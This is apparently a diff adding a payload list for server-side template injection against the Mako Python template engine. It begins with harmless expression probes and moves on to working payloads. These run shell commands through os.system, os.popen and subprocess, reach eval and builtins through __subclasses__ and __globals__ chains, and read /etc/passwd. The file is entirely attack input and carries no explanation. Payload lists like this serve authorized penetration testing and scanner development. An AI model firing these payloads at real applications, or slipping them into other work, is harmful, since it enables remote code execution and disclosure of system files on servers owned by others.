@@ -1,0 +1,23 @@
+${7*7}
+${7*'7'}
+${config}
+${"".class}
+${"".join('abc')}
+<%doc>test</%doc>
+${eval('7*7')}
+${self.module}
+${self.module.cache_enabled}
+${self.template.module}
+<%!import os%>${os.system('id')}
+<%!import os%>${os.popen('id').read()}
+${self.module.__builtins__}
+${x.__class__.__mro__[1].__subclasses__()}
+<%! from mako.template import Template %>
+${Template("${7*7}").render()}
+<%text>hello</%text>
+${''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}
+${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}
+<%!import subprocess%>${subprocess.Popen(['id'],stdout=-1).communicate()[0]}
+${g.pop.__globals__['__builtins__']['eval']('__import__("os").system("id")')}
+${self.__init__.__globals__['util'].compat.inspect.os.system('id')}
+${namespace.__init__.__globals__['util'].compat.inspect.os.popen('id').read()}
